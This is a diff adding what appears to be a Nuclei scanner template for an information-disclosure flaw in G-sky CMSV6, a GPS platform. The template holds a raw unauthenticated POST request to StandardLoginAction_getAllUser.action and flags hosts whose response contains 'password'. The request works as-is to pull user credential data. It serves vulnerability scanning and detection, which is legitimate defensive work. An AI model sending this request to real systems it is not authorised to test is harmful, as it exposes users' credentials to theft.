@@ -1,0 +1,30 @@
+id: G-sky-CMSV6-StandardLoginAction_getAlser-infovul
+
+info:
+  name: "G-sky-CMSV6-StandardLoginAction_getAlser-infovul 信息泄露漏洞"
+  author: pitaya
+  severity: high
+  
+
+  tags: G-sky-CMS
+http:
+  - raw:
+      - |
+        POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Connection: close
+        Content-Length: 9
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+
+        json=null
+    
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains_all(body_1, "password")'  
+        condition: and
